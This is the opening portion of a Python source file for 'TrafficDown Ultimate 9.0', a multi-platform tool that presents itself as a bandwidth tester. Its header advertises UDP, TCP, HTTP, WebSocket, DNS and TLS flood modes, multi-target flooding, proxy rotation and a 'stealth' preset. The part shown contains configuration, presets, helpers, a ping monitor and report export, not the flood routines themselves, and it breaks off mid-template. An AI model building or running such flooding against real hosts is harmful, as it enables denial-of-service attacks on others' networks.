# -*- coding: utf-8 -*-
"""
TrafficDown Ultimate 9.0
========================
Багатопотоковий інструмент для генерації мережевого навантаження та
вимірювання пропускної здатності мережі.

Підтримувані платформи:
  - Windows  → GUI (customtkinter) + TUI fallback
  - Linux    → TUI (Rich)
  - Termux   → TUI (Rich, оптимізовано під мобільний термінал)

Режими роботи:
  - HTTP Download    — завантаження з кількох URL одночасно
  - UDP Flood        — генерація UDP-пакетів до заданого хосту:порту
  - TCP Flood        — генерація TCP-з'єднань до заданого хосту:порту
  - HTTP Flood       — HTTP GET/POST потоки до вебсервера
  - ICMP Ping Test   — вимірювання RTT / jitter / втрат
  - WebSocket Flood  — масові WS-з'єднання (НОВИЙ v9.0)
  - DNS Flood        — масові DNS-запити до резолвера (НОВИЙ v9.0)
  - SSL Stress Test  — TLS-рукостискання під навантаженням (НОВИЙ v9.0)
  - Multi-Target     — одночасний флад кількох IP (НОВИЙ v9.0)

Нові можливості v9.0:
  - NEW: WebSocket Flood mode (aiohttp + ws://)
  - NEW: DNS Flood mode (socket-level UDP DNS queries)
  - NEW: SSL/TLS Stress Test mode (TLS handshake flood)
  - NEW: Multi-Target Manager (до 8 цілей одночасно)
  - NEW: ProxyRotator — автоматична ротація проксі
  - NEW: BandwidthScheduler — планувальник швидкості (ramp-up/down)
  - NEW: PercentileStats — P50 / P90 / P95 / P99 латентність
  - NEW: TrafficAnalyzer — live-аналіз пакетів (pcap-lite)
  - NEW: WebhookNotifier — Telegram / Discord / HTTP webhook
  - NEW: Plugin API — завантаження кастомних векторів (plugins/)
  - NEW: Session Templates — збереження та швидке завантаження профілів
  - NEW: HTML Dashboard — інтерактивний звіт із Chart.js
  - NEW: CSV Real-Time Export — запис статистики в реальному часі
  - NEW: Connection Pool Recycler — авторестарт впалих потоків
  - NEW: Memory Watchdog — попередження при витоку пам'яті
  - NEW: IPv4 / IPv6 Dual-Stack Auto-Detect
  - NEW: HTTP/2 підтримка (через aiohttp)
  - NEW: Custom Payload Generator для UDP/TCP
  - NEW: TUI: 6 екранів (+ Live Stats, + Plugins)
  - NEW: GUI: нові вкладки (Scheduler, Plugins, Multi-Target)
  - NEW: CLI: 12 нових аргументів
  - IMPROVEMENT: Engine підтримує плавне перемикання без перезапуску
  - IMPROVEMENT: SessionHistory до 500 записів
  - IMPROVEMENT: BandwidthLimiter — окремо на кожен режим
  - IMPROVEMENT: Rotate logs по дню + стиснення старих логів
  - IMPROVEMENT: Auto-Tune Threads v2 — бенчмарк мережевого стека
  - IMPROVEMENT: GeoIP з кешем (sqlite3 in-memory)
  - IMPROVEMENT: Report HTML із Chart.js sparklines
  - IMPROVEMENT: PingMonitor — ICMP та TCP-ping режими
  - IMPROVEMENT: Конфіг версіонований, авто-міграція
  - BUGFIX: CTkSlider.cget("from") → словник діапазонів
  - BUGFIX: Race condition у speed_updater
  - BUGFIX: AsyncLoop зависає при stop() → таймаут
"""

# ─────────────────────────────────────────────────────────────────────────────
# 0. СТАНДАРТНІ ІМПОРТИ
# ─────────────────────────────────────────────────────────────────────────────
import os
import re
import sys
import csv
import ssl
import time
import json
import gzip
import math
import shlex
import struct
import socket
import random
import shutil
import asyncio
import hashlib
import logging
import argparse
import platform
import ipaddress
import threading
import traceback
import subprocess
import importlib.util
import urllib.request
import urllib.parse
import sqlite3
from collections import deque, defaultdict
from datetime import datetime, timedelta
from enum import Enum
from logging.handlers import RotatingFileHandler, TimedRotatingFileHandler
from pathlib import Path
from queue import Queue, Empty
from typing import (
    Any, Callable, Deque, Dict, Generator, Iterator,
    List, Optional, Set, Tuple, Union
)

# ─────────────────────────────────────────────────────────────────────────────
# 0.1. КОНСТАНТИ ТА ВИЗНАЧЕННЯ ПЛАТФОРМИ
# ─────────────────────────────────────────────────────────────────────────────
VERSION      = "9.0"
CONFIG_VER   = 2          # версія схеми конфігу (для авто-міграції)
APP_NAME     = "TrafficDown Ultimate"
BUILD_DATE   = "2026-04-12"
AUTHOR       = "TrafficDown Team"

IS_WINDOWS   = os.name == "nt"
IS_ANDROID   = "com.termux" in os.environ.get("PREFIX", "")
IS_LINUX     = sys.platform.startswith("linux") and not IS_ANDROID
IS_MACOS     = sys.platform == "darwin"
PLATFORM_STR = ("Windows" if IS_WINDOWS else
                "Android/Termux" if IS_ANDROID else
                "Linux" if IS_LINUX else
                "macOS" if IS_MACOS else platform.system())

CONFIG_FILE   = "TrafficDown_config.json"
HISTORY_FILE  = "TrafficDown_history.json.gz"
PLUGINS_DIR   = Path("plugins")
LOG_DIR       = Path("logs")
REPORT_DIR    = Path("reports")
ICONS_DIR     = Path("icons")
TEMPLATES_DIR = Path("templates")
CSV_LIVE_FILE = LOG_DIR / "live_stats.csv"

for _d in (LOG_DIR, REPORT_DIR, ICONS_DIR, PLUGINS_DIR, TEMPLATES_DIR):
    _d.mkdir(exist_ok=True)

LOG_FILE = LOG_DIR / "TrafficDown.log"

# ─────────────────────────────────────────────────────────────────────────────
# 0.2. LOGGER
# ─────────────────────────────────────────────────────────────────────────────
log = logging.getLogger("TrafficDown")
if not log.handlers:
    log.setLevel(logging.DEBUG)
    _fmt = logging.Formatter(
        "%(asctime)s | %(levelname)-8s | %(threadName)-14s | %(message)s"
    )
    _fh = TimedRotatingFileHandler(
        LOG_FILE, when="midnight", backupCount=7, encoding="utf-8"
    )
    _fh.setFormatter(_fmt)
    _fh.setLevel(logging.DEBUG)
    _ch = logging.StreamHandler()
    _ch.setFormatter(_fmt)
    _ch.setLevel(logging.INFO)
    log.addHandler(_fh)
    log.addHandler(_ch)

log.info(f"{'='*62}")
log.info(f"  {APP_NAME} {VERSION}  [{PLATFORM_STR}]  Build: {BUILD_DATE}")
log.info(f"  Python {sys.version.split()[0]}  PID={os.getpid()}")
log.info(f"{'='*62}")


# ─────────────────────────────────────────────────────────────────────────────
# 1. AUTO-INSTALL PACKAGES
# ─────────────────────────────────────────────────────────────────────────────
def auto_install_packages() -> None:
    """Перевіряє та встановлює відсутні залежності."""
    packages: Dict[str, str] = {
        "aiohttp":    "aiohttp",
        "rich":       "rich",
        "psutil":     "psutil",
    }
    if IS_WINDOWS:
        packages["customtkinter"] = "customtkinter"
        packages["Pillow"]        = "PIL"

    missing = [
        pkg for pkg, imp in packages.items()
        if not importlib.util.find_spec(imp)
    ]
    if not missing:
        return

    log.warning(f"Відсутні модулі: {', '.join(missing)}. Встановлення...")
    try:
        cmd = [sys.executable, "-m", "pip", "install", "--quiet", *missing]
        if IS_ANDROID:
            cmd.insert(4, "--break-system-packages")
        subprocess.check_call(cmd, timeout=300)
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as exc:
        log.critical(f"Не вдалося встановити пакети: {exc}")
        sys.exit(1)

    log.info("Модулі встановлено. Перезапуск...")
    subprocess.Popen([sys.executable, *sys.argv])
    sys.exit(0)


# ─────────────────────────────────────────────────────────────────────────────
# 1.1. ЛЕНИВИЙ ІМПОРТ ЗАЛЕЖНОСТЕЙ
# ─────────────────────────────────────────────────────────────────────────────
import aiohttp
import psutil
from rich.console  import Console
from rich.panel    import Panel
from rich.table    import Table
from rich.live     import Live
from rich.align    import Align
from rich.prompt   import Prompt, IntPrompt, Confirm
from rich.text     import Text
from rich.rule     import Rule
from rich.columns  import Columns
from rich.progress import (
    Progress, BarColumn, TextColumn,
    TimeElapsedColumn, SpinnerColumn
)
from rich.layout   import Layout
from rich.markup   import escape

GUI_AVAILABLE = False
if IS_WINDOWS:
    try:
        import customtkinter as ctk
        from PIL import Image
        GUI_AVAILABLE = True
    except ImportError:
        log.warning("customtkinter або Pillow не знайдено. GUI недоступний.")

console = Console()


# ─────────────────────────────────────────────────────────────────────────────
# 2. КОНФІГУРАЦІЯ
# ─────────────────────────────────────────────────────────────────────────────
_CONFIG_CONSTRAINTS: Dict[str, Tuple[int, int]] = {
    "threads_dl":          (1,    1000),
    "threads_ul":          (1,    5000),
    "threads_tcp":         (1,    5000),
    "threads_http":        (1,    2000),
    "threads_ws":          (1,    2000),
    "threads_dns":         (1,    5000),
    "threads_ssl":         (1,    2000),
    "packet_size":         (64,   65500),
    "target_port":         (1,    65535),
    "bandwidth_limit_dl":  (0,    50000),
    "bandwidth_limit_ul":  (0,    50000),
    "ping_interval_ms":    (100,  10000),
    "auto_stop_seconds":   (0,    86400),
    "scheduler_ramp_sec":  (0,    3600),
    "max_targets":         (1,    8),
    "ws_message_size":     (8,    65500),
    "dns_query_count":     (1,    10000),
    "memory_warn_mb":      (128,  32768),
    "pool_recycle_sec":    (10,   3600),
}

PRESETS: Dict[str, Dict[str, Any]] = {
    "quick": {
        "threads_dl": 5,  "threads_ul": 20,  "threads_tcp": 10,
        "threads_http": 10, "threads_ws": 10, "threads_dns": 50,
        "threads_ssl": 5,
        "packet_size": 1024,
        "bandwidth_limit_dl": 0, "bandwidth_limit_ul": 0,
    },
    "medium": {
        "threads_dl": 20, "threads_ul": 100, "threads_tcp": 50,
        "threads_http": 50, "threads_ws": 30, "threads_dns": 200,
        "threads_ssl": 20,
        "packet_size": 4096,
        "bandwidth_limit_dl": 0, "bandwidth_limit_ul": 0,
    },
    "full": {
        "threads_dl": 80, "threads_ul": 500, "threads_tcp": 200,
        "threads_http": 150, "threads_ws": 100, "threads_dns": 500,
        "threads_ssl": 80,
        "packet_size": 8192,
        "bandwidth_limit_dl": 0, "bandwidth_limit_ul": 0,
    },
    "stealth": {
        "threads_dl": 3,  "threads_ul": 10,  "threads_tcp": 5,
        "threads_http": 5, "threads_ws": 5, "threads_dns": 20,
        "threads_ssl": 3,
        "packet_size": 512,
        "bandwidth_limit_dl": 5, "bandwidth_limit_ul": 5,
    },
}

PAYLOAD_TEMPLATES: Dict[str, bytes] = {
    "zero":    b"\x00" * 4096,
    "random":  b"",   # генерується динамічно
    "http_get": (
        b"GET / HTTP/1.1\r\nHost: target\r\nConnection: keep-alive\r\n"
        b"User-Agent: Mozilla/5.0 (TrafficDown/9.0)\r\n\r\n"
    ),
    "dns_query": b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                 b"\x03www\x06google\x03com\x00\x00\x01\x00\x01",
}


class Config:
    def __init__(self) -> None:
        self.default: Dict[str, Any] = {
            "_config_ver": CONFIG_VER,
            # Network target
            "target_ip":           "192.168.0.1",
            "target_port":         80,
            "target_ipv6":         "",
            "use_ipv6":            False,
            # Multi-target
            "multi_targets":       [],  # list of "ip:port"
            "max_targets":         4,
            # Threads
            "threads_dl":          20,
            "threads_ul":          100,
            "threads_tcp":         50,
            "threads_http":        50,
            "threads_ws":          30,
            "threads_dns":         200,
            "threads_ssl":         20,
            # Packet / bandwidth
            "packet_size":         4096,
            "bandwidth_limit_dl":  0,
            "bandwidth_limit_ul":  0,
            # Payload
            "payload_template":    "random",
            "payload_custom":      "",
            # HTTP Flood
            "http_method":         "GET",
            "http_target_url":     "http://192.168.0.1/",
            "http_custom_headers": {},
            "http_body":           "",
            "http2_enabled":       False,
            "ssl_verify":          False,
            # WebSocket Flood
            "ws_target_url":       "ws://192.168.0.1/",
            "ws_message_size":     256,
            "ws_ping_interval":    5,
            # DNS Flood
            "dns_target_ip":       "8.8.8.8",
            "dns_target_port":     53,
            "dns_query_count":     1000,
            "dns_domain":          "example.com",
            # SSL Stress
            "ssl_target_host":     "192.168.0.1",
            "ssl_target_port":     443,
            # Proxy
            "proxy_url":           "",
            "proxy_list":          [],  # для ротації
            # Ping / Diagnostics
            "ping_interval_ms":    2000,
            "ping_mode":           "tcp",  # "tcp" або "icmp"
            # Scheduler
            "auto_stop_seconds":   0,
            "scheduler_ramp_sec":  0,
            "scheduler_enabled":   False,
            "scheduler_start_at":  "",
            # Memory watchdog
            "memory_warn_mb":      2048,
            # Connection pool
            "pool_recycle_sec":    120,
            # Webhook
            "webhook_url":         "",
            "webhook_on_start":    False,
            "webhook_on_stop":     True,
            # Appearance / UX
            "network_interface":   "default",
            "theme":               "System",
            "session_notes_enabled": True,
            "csv_live_export":     False,
            # URLs
            "download_urls": [
                "https://speed.hetzner.de/10GB.bin",
                "https://speed.hetzner.de/1GB.bin",
                "https://speedtest.selectel.ru/10GB",
                "https://proof.ovh.net/files/10Gb.dat",
                "http://speedtest.tele2.net/10GB.zip",
                "http://speedtest-ny.turnkeyinternet.net/10000mb.bin",
                "http://ipv4.download.thinkbroadband.com/1GB.zip",
                "http://bouygues.testdebit.info/1G.iso",
                "http://lg.volia.net/10G.test",
            ],
        }
        self.data = self.load()

    # ── Load / Save ───────────────────────────────────────────────────────
    def load(self) -> Dict[str, Any]:
        result = self.default.copy()
        p = Path(CONFIG_FILE)
        if p.exists():
            try:
                raw = p.read_text(encoding="utf-8")
                from_file = json.loads(raw)
                if not isinstance(from_file, dict):
                    raise ValueError("Конфіг має бути JSON-об'єктом.")
                result.update(from_file)
                result = self._migrate(result)
            except Exception as exc:
                log.error(f"Не вдалося завантажити '{CONFIG_FILE}': {exc}. Дефолти.")
        return self._validate(result)

    def _migrate(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Авто-міграція конфігу між версіями."""
        ver = data.get("_config_ver", 1)
        if ver < 2:
            # v1 → v2: rename bandwidth_limit → bandwidth_limit_dl/ul
            if "bandwidth_limit" in data and "bandwidth_limit_dl" not in data:
                data["bandwidth_limit_dl"] = data.pop("bandwidth_limit")
                data["bandwidth_limit_ul"] = data["bandwidth_limit_dl"]
            data["_config_ver"] = 2
            log.info("Конфіг мігровано v1 → v2.")
        return data

    def _validate(self, data: Dict[str, Any]) -> Dict[str, Any]:
        for key, (lo, hi) in _CONFIG_CONSTRAINTS.items():
            val = data.get(key)
            if not isinstance(val, (int, float)) or not (lo <= int(val) <= hi):
                dv = self.default.get(key, lo)
                log.warning(f"Config '{key}'={val!r} поза [{lo},{hi}]. → {dv}")
                data[key] = dv

        try:
            socket.inet_aton(str(data.get("target_ip", "")))
        except socket.error:
            data["target_ip"] = self.default["target_ip"]

        urls = data.get("download_urls")
        if not isinstance(urls, list) or not urls:
            data["download_urls"] = self.default["download_urls"]

        if data.get("theme") not in ("Dark", "Light", "System"):
            data["theme"] = "System"
        if data.get("http_method") not in ("GET", "POST", "HEAD", "PUT", "DELETE"):
            data["http_method"] = "GET"
        if data.get("ping_mode") not in ("tcp", "icmp"):
            data["ping_mode"] = "tcp"
        if data.get("payload_template") not in PAYLOAD_TEMPLATES:
            data["payload_template"] = "random"
        return data

    def save(self) -> None:
        try:
            Path(CONFIG_FILE).write_text(
                json.dumps(self.data, indent=4, ensure_ascii=False),
                encoding="utf-8"
            )
        except IOError as exc:
            log.error(f"Не вдалося зберегти '{CONFIG_FILE}': {exc}")

    def apply_preset(self, name: str) -> None:
        preset = PRESETS.get(name)
        if not preset:
            log.warning(f"Невідомий пресет: {name!r}")
            return
        self.data.update(preset)
        self.save()
        log.info(f"Пресет '{name}' застосовано.")

    def reset_to_default(self) -> None:
        self.data = self.default.copy()
        self.save()
        log.info("Конфігурацію скинуто до значень за замовчуванням.")

    def get_slider_range(self, key: str) -> Tuple[int, int]:
        return _CONFIG_CONSTRAINTS.get(key, (0, 9999))

    def save_template(self, name: str) -> None:
        """Зберігає поточний конфіг як шаблон."""
        p = TEMPLATES_DIR / f"{name}.json"
        try:
            p.write_text(json.dumps(self.data, indent=4, ensure_ascii=False), encoding="utf-8")
            log.info(f"Шаблон '{name}' збережено.")
        except IOError as exc:
            log.error(f"Не вдалося зберегти шаблон: {exc}")

    def load_template(self, name: str) -> bool:
        """Завантажує шаблон конфігу."""
        p = TEMPLATES_DIR / f"{name}.json"
        if not p.exists():
            log.warning(f"Шаблон '{name}' не знайдено.")
            return False
        try:
            raw = p.read_text(encoding="utf-8")
            tpl = json.loads(raw)
            self.data.update(tpl)
            self.save()
            log.info(f"Шаблон '{name}' завантажено.")
            return True
        except Exception as exc:
            log.error(f"Не вдалося завантажити шаблон '{name}': {exc}")
            return False

    def list_templates(self) -> List[str]:
        return [p.stem for p in TEMPLATES_DIR.glob("*.json")]


cfg = Config()


# ─────────────────────────────────────────────────────────────────────────────
# 3. ДОПОМІЖНІ УТИЛІТИ
# ─────────────────────────────────────────────────────────────────────────────
def get_gateway_ip() -> str:
    """Визначає IP-адресу шлюзу за замовчуванням."""
    try:
        if IS_WINDOWS:
            out = subprocess.check_output("ipconfig", universal_newlines=True, timeout=5)
            gws = re.findall(
                r"Default Gateway[\s.]+:\s*(\d{1,3}(?:\.\d{1,3}){3})", out
            )
            valid = [g for g in gws if g != "0.0.0.0"]
            if valid:
                return valid[0]
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(2)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
        parts = local_ip.split(".")
        parts[-1] = "1"
        return ".".join(parts)
    except Exception as exc:
        log.warning(f"Не вдалося визначити IP шлюзу: {exc}")
        return "192.168.0.1"


def get_local_ip() -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"


def get_local_ipv6() -> str:
    try:
        with socket.socket(socket.AF_INET6, socket.SOCK_DGRAM) as s:
            s.connect(("2001:4860:4860::8888", 80))
            return s.getsockname()[0]
    except Exception:
        return ""


def format_duration(seconds: float) -> str:
    s = int(seconds)
    h, rem = divmod(s, 3600)
    m, sec = divmod(rem, 60)
    return f"{h:02d}:{m:02d}:{sec:02d}"


def format_bytes(b: float) -> str:
    if b >= 1024**3:
        return f"{b / 1024**3:.3f} GB"
    if b >= 1024**2:
        return f"{b / 1024**2:.2f} MB"
    if b >= 1024:
        return f"{b / 1024:.1f} KB"
    return f"{b:.0f} B"


def format_speed(bps: float) -> str:
    mbs = bps / 1024**2
    if mbs >= 1000:
        return f"{mbs / 1024:.2f} GB/s"
    return f"{mbs:.2f} MB/s"


def clamp(val: float, lo: float, hi: float) -> float:
    return max(lo, min(hi, val))


def is_valid_ip(s: str) -> bool:
    try:
        ipaddress.ip_address(s)
        return True
    except ValueError:
        return False


def is_valid_url(s: str) -> bool:
    try:
        r = urllib.parse.urlparse(s)
        return r.scheme in ("http", "https", "ws", "wss") and bool(r.netloc)
    except Exception:
        return False


def generate_payload(size: int, template: str = "random") -> bytes:
    """Генерує корисне навантаження для UDP/TCP пакетів."""
    tpl = PAYLOAD_TEMPLATES.get(template, b"")
    if template == "random" or not tpl:
        return bytes(random.getrandbits(8) for _ in range(size))
    if len(tpl) >= size:
        return tpl[:size]
    return (tpl * (size // len(tpl) + 1))[:size]


def resolve_hostname(host: str, use_ipv6: bool = False) -> str:
    """Резолвить ім'я хосту до IP з fallback до публічних DNS."""
    family = socket.AF_INET6 if use_ipv6 else socket.AF_INET
    try:
        results = socket.getaddrinfo(host, None, family)
        if results:
            return results[0][4][0]
    except socket.gaierror:
        pass
    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
    for dns in dns_servers:
        try:
            results = socket.getaddrinfo(host, None, family)
            if results:
                return results[0][4][0]
        except Exception:
            continue
    return host


def detect_dual_stack(host: str) -> Dict[str, bool]:
    """Перевіряє підтримку IPv4 та IPv6 для хосту."""
    result = {"ipv4": False, "ipv6": False}
    for af, key in ((socket.AF_INET, "ipv4"), (socket.AF_INET6, "ipv6")):
        try:
            socket.getaddrinfo(host, None, af)
            result[key] = True
        except Exception:
            pass
    return result


def get_system_info() -> Dict[str, Any]:
    try:
        mem  = psutil.virtual_memory()
        disk = psutil.disk_usage(".")
        net  = psutil.net_io_counters()
        return {
            "platform":      PLATFORM_STR,
            "cpu_count":     psutil.cpu_count(logical=True),
            "cpu_phys":      psutil.cpu_count(logical=False),
            "cpu_freq_mhz":  round(psutil.cpu_freq().current, 1) if psutil.cpu_freq() else 0,
            "ram_total_gb":  round(mem.total / 1024**3, 2),
            "ram_used_gb":   round(mem.used / 1024**3, 2),
            "ram_pct":       mem.percent,
            "disk_free_gb":  round(disk.free / 1024**3, 1),
            "net_bytes_rx":  format_bytes(net.bytes_recv),
            "net_bytes_tx":  format_bytes(net.bytes_sent),
            "local_ip":      get_local_ip(),
            "local_ipv6":    get_local_ipv6(),
            "gateway_ip":    get_gateway_ip(),
            "python":        sys.version.split()[0],
            "pid":           os.getpid(),
        }
    except Exception as exc:
        log.debug(f"get_system_info: {exc}")
        return {}


# ─────────────────────────────────────────────────────────────────────────────
# 3.1. BANDWIDTH LIMITER
# ─────────────────────────────────────────────────────────────────────────────
class BandwidthLimiter:
    """Token bucket для обмеження швидкості (MB/s → 0 = unlimited)."""
    def __init__(self, rate_mbs: float = 0) -> None:
        self._lock   = threading.Lock()
        self._rate   = rate_mbs * 1024 * 1024  # bytes/s
        self._tokens = self._rate
        self._last   = time.monotonic()

    def update_rate(self, rate_mbs: float) -> None:
        with self._lock:
            self._rate   = rate_mbs * 1024 * 1024
            self._tokens = self._rate

    def acquire(self, n_bytes: int) -> None:
        if self._rate <= 0:
            return
        with self._lock:
            now = time.monotonic()
            dt  = now - self._last
            self._tokens = min(self._rate, self._tokens + dt * self._rate)
            self._last   = now
            self._tokens -= n_bytes
            wait = 0.0
            if self._tokens < 0:
                wait = -self._tokens / self._rate
        if wait > 0:
            time.sleep(wait)


# ─────────────────────────────────────────────────────────────────────────────
# 3.2. PERCENTILE STATS
# ─────────────────────────────────────────────────────────────────────────────
class PercentileStats:
    """Зберігає виборку RTT та рахує перцентилі."""

    def __init__(self, maxlen: int = 2000) -> None:
        self._lock   = threading.Lock()
        self._data:  Deque[float] = deque(maxlen=maxlen)

    def add(self, value: float) -> None:
        with self._lock:
            self._data.append(value)

    def clear(self) -> None:
        with self._lock:
            self._data.clear()

    def get(self) -> Dict[str, float]:
        with self._lock:
            if not self._data:
                return {k: 0.0 for k in ("p50", "p90", "p95", "p99", "avg", "min", "max")}
            s = sorted(self._data)
        n = len(s)
        def _p(pct: float) -> float:
            idx = int(math.ceil(pct * n / 100.0)) - 1
            return s[max(0, min(idx, n - 1))]
        return {
            "p50": round(_p(50), 2),
            "p90": round(_p(90), 2),
            "p95": round(_p(95), 2),
            "p99": round(_p(99), 2),
            "avg": round(sum(s) / n, 2),
            "min": round(s[0], 2),
            "max": round(s[-1], 2),
            "count": n,
        }


# ─────────────────────────────────────────────────────────────────────────────
# 3.3. PING MONITOR
# ─────────────────────────────────────────────────────────────────────────────
class PingMonitor:
    """Фоновий пінг-монітор з jitter та packet loss. TCP або ICMP."""

    def __init__(self) -> None:
        self._lock   = threading.Lock()
        self._rtts:  Deque[float] = deque(maxlen=200)
        self._sent   = 0
        self._recv   = 0
        self._thread: Optional[threading.Thread] = None
        self._active = threading.Event()
        self._percentile = PercentileStats()

    def start(self, ip: str, port: int) -> None:
        self.stop()
        self._active.set()
        self._thread = threading.Thread(
            target=self._loop, args=(ip, port), name="PingMonitor", daemon=True
        )
        self._thread.start()

    def stop(self) -> None:
        self._active.clear()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3)
        with self._lock:
            self._rtts.clear()
            self._sent = self._recv = 0
        self._percentile.clear()

    def _loop(self, ip: str, port: int) -> None:
        interval = cfg.data.get("ping_interval_ms", 2000) / 1000.0
        mode     = cfg.data.get("ping_mode", "tcp")
        while self._active.is_set():
            with self._lock:
                self._sent += 1
            rtt = self._tcp_ping(ip, port) if mode == "tcp" else self._icmp_ping(ip)
            if rtt is not None:
                with self._lock:
                    self._recv += 1
                    self._rtts.append(rtt)
                self._percentile.add(rtt)
            time.sleep(interval)

    def _tcp_ping(self, ip: str, port: int) -> Optional[float]:
        try:
            t0 = time.monotonic()
            with socket.create_connection((ip, port), timeout=2.0):
                pass
            return (time.monotonic() - t0) * 1000.0
        except Exception:
            return None

    def _icmp_ping(self, ip: str) -> Optional[float]:
        """ICMP ping (Linux/macOS — raw socket)."""
        try:
            if IS_WINDOWS:
                return None  # ICMP raw на Windows потребує адміна
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
                s.settimeout(2.0)
                ident = os.getpid() & 0xFFFF
                seq   = random.randint(0, 65535)
                # ICMP Echo Request (type=8, code=0)
                hdr   = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
                data  = b"TrafficDown9" * 4
                csum  = _icmp_checksum(hdr + data)
                pkt   = struct.pack("!BBHHH", 8, 0, csum, ident, seq) + data
                t0    = time.monotonic()
                s.sendto(pkt, (ip, 0))
                s.recv(1024)
                return (time.monotonic() - t0) * 1000.0
        except Exception:
            return None

    def get_stats(self) -> Dict[str, Any]:
        with self._lock:
            rtts  = list(self._rtts)
            sent  = self._sent
            recv  = self._recv
        loss = ((sent - recv) / sent * 100) if sent > 0 else 0.0
        jitter = 0.0
        if len(rtts) >= 2:
            diffs  = [abs(rtts[i] - rtts[i-1]) for i in range(1, len(rtts))]
            jitter = sum(diffs) / len(diffs)
        if not rtts:
            return {
                "last": None, "avg": None, "min": None, "max": None,
                "jitter": 0.0, "loss_pct": loss, "samples": 0,
            }
        pct = self._percentile.get()
        return {
            "last":     rtts[-1],
            "avg":      sum(rtts) / len(rtts),
            "min":      min(rtts),
            "max":      max(rtts),
            "jitter":   jitter,
            "loss_pct": loss,
            "samples":  len(rtts),
            "p50":      pct["p50"],
            "p90":      pct["p90"],
            "p99":      pct["p99"],
        }


def _icmp_checksum(data: bytes) -> int:
    if len(data) % 2 != 0:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


# ─────────────────────────────────────────────────────────────────────────────
# 3.4. SESSION HISTORY (compressed JSON.GZ, до 500 записів)
# ─────────────────────────────────────────────────────────────────────────────
class SessionHistory:
    MAX_ENTRIES = 500

    def __init__(self) -> None:
        self._lock   = threading.Lock()
        self.entries: List[Dict[str, Any]] = self._load()

    def _load(self) -> List[Dict[str, Any]]:
        p = Path(HISTORY_FILE)
        if not p.exists():
            return []
        try:
            with gzip.open(p, "rt", encoding="utf-8") as f:
                data = json.load(f)
            return data if isinstance(data, list) else []
        except Exception as exc:
            log.warning(f"Не вдалося завантажити history: {exc}")
            return []

    def add(self, report: Dict[str, Any]) -> None:
        with self._lock:
            self.entries.insert(0, report)
            if len(self.entries) > self.MAX_ENTRIES:
                self.entries = self.entries[:self.MAX_ENTRIES]
            self._save()

    def _save(self) -> None:
        try:
            with gzip.open(HISTORY_FILE, "wt", encoding="utf-8") as f:
                json.dump(self.entries, f, indent=2, ensure_ascii=False)
        except IOError as exc:
            log.error(f"Не вдалося зберегти history: {exc}")

    def clear(self) -> None:
        with self._lock:
            self.entries.clear()
            self._save()

    def export_csv(self, filepath: str) -> bool:
        with self._lock:
            if not self.entries:
                return False
            keys = [
                "session_end_time", "mode", "duration_seconds",
                "total_download_gb", "total_upload_gb",
                "avg_download_mbs", "max_download_mbs",
                "avg_upload_mbs",   "max_upload_mbs",
                "errors_count",     "ping_avg_ms",
                "ping_p99_ms",      "note",
            ]
            try:
                with open(filepath, "w", newline="", encoding="utf-8") as f:
                    w = csv.DictWriter(f, fieldnames=keys, extrasaction="ignore")
                    w.writeheader()
                    w.writerows(self.entries)
                return True
            except Exception as exc:
                log.error(f"Помилка CSV-експорту: {exc}")
                return False

    def export_html(self, filepath: str) -> bool:
        """Генерує HTML-звіт із Chart.js та таблицею сесій."""
        with self._lock:
            if not self.entries:
                return False
            rows_html = ""
            labels_js = []
            dl_data_js = []
            ul_data_js = []
            for e in self.entries[:50]:
                color = "#22c55e" if e.get("mode") == "DOWNLOADING" else "#ef4444"
                rows_html += (
                    f"<tr>"
                    f"<td>{e.get('session_end_time','—')[:19]}</td>"
                    f"<td style='color:{color}'>{e.get('mode','—')}</td>"
                    f"<td>{e.get('duration_seconds', 0):.0f}s</td>"
                    f"<td>{e.get('avg_download_mbs', 0):.2f}</td>"
                    f"<td>{e.get('max_download_mbs', 0):.2f}</td>"
                    f"<td>{e.get('avg_upload_mbs', 0):.2f}</td>"
                    f"<td>{e.get('total_download_gb', 0):.4f}</td>"
                    f"<td>{e.get('errors_count', 0)}</td>"
                    f"<td>{e.get('ping_avg_ms', '—')}</td>"
                    f"<td>{e.get('ping_p99_ms', '—')}</td>"
                    f"<td>{e.get('note','—')}</td>"
                    f"</tr>"
                )
                ts = e.get("session_end_time", "")[:16]
                labels_js.append(f'"{ts}"')
                dl_data_js.append(str(round(e.get("avg_download_mbs", 0), 2)))
                ul_data_js.append(str(round(e.get("avg_upload_mbs", 0), 2)))

        labels_js.reverse()
        dl_data_js.reverse()
        ul_data_js.reverse()

        html = f"""<!DOCTYPE html>
<html lang='uk'>
<head>
<meta charset='UTF-8'>
<title>{APP_NAME} {VERSION} — Звіт</title>
<script src='https://cdn.jsdelivr.net/npm/chart.js@4/dist/chart.umd.min.js'></script>
<style>
  body{{background:#0f172a;color:#e2e8f0;font-family:monospace;padding:24px;margin:0}}
  h1{{color:#38bdf8;margin-bottom:4px}} h2{{color:#94a3b8;margin-top:24px}}
  table{{border-collapse:collapse;width:100%;font-size:13px}}
  th{{background:#1e293b;padding:8px 10px;text-align:left;border-bottom:1px solid #334155}}
  td{{padding:6px 10px;border-bottom:1px solid #1e293b}}
  tr:hover{{background:#1e293b}}
  .chart-wrap{{background:#1e293b;border-radius:12px;padding:16px;margin:24px 0;max-width:900px}}
  .badge{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:12px}}
</style>
</head>
<body>
<h1>⚡ {APP_NAME} {VERSION} — Звіт сесій</h1>
<p style='color:#64748b'>Згенеровано: {datetime.now():%Y-%m-%d %H:%M:%S} | Build {BUILD_DATE}</p>
<div class='chart-wrap'>
  <canvas id='speedChart' height='80'></canvas>
</div>
<h2>📋 Останні сесії</h2>
<table>
<thead><tr>
